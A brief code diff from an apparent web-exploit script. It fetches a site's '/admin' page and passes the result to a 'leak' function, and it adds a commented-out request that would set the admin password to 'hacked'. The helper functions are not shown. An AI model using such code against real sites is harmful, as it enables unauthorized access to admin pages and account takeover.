@@ -54,6 +54,7 @@ function postPageFetch(url, data) {
 
 async function main() {
  	leak(await getPageFetch('/admin'));
+	//leak( await postPageFetch('/admin', '["password":"hacked"]'));
  	//console.log(await getPageFetch('/'));
 }
 main();
